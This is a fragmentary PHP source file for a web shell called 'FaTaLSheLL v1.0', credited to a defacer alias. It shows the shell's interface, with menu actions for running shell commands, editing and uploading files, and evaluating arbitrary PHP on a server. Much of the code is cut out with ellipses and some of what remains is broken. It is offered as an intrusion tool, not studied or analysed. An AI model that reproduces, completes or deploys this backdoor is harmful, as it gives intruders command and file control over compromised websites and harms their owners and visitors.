...
if(isset($_POST['upload'])){
	...
	<?php $header;?><style type="text/css">
<!--
.style4 {
	font-size: x-large;
	font-weight: bold;
...
<a href="#" onclick="document.reqs.action.value='viewer';document.reqs.dir.value='<?php $dir;?>'; document.reqs.submit();"><p align="center" class="style4">FaTaLSheLL v1.0 Edited By KingDefacer</p></a>
<table width="100%" bgcolor="#336600" align="right" border="0" cellspacing="0" cellpadding="0"><tr><td><table><tr><td>
<a href="#" onclick="document.reqs.action.value='shell';document.reqs.dir.value='<?php $dir;?>';
 document.reqs.submit();">| Shell </a></td><td><a href="#" onclick="document.reqs.action.value='viewer';
 document.reqs.dir.value='<?php $dir;?>'; document.reqs.submit();
 ">
 | Main Page</a></td><td><a href="#" onclick="document.reqs.action.value='editor';document.reqs.file.value='<?php $file;?>';
 document.reqs.dir.value='<?php $dir;?>'; document.reqs.submit();">
 | Edit File</a></td><td><a href="#" onclick="document.reqs.action.value='upload';document.reqs.dir.value='<?php $dir;?>';
 document.reqs.submit();">| Upload File</a></td><td><a href="#" onclick="document.reqs.action.value='phpeval';
 document.reqs.dir.value='<?php $dir;?>'; document.reqs.submit();">| Php Eval |</a></td><td><a href="#" onclick="history.back();">
...
<table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%"
 ...
 <br>
	  ...
	  </tr></table><table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top"><?php $content;?></td></tr></table><table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"><tr><td><table><tr><td>	  <a href="http://alturks.com">COPYRIGHT 2010 - Edited By KingDefacer <?php $version;?></a></td></tr></table></tr></td></table><?php $footer;?>
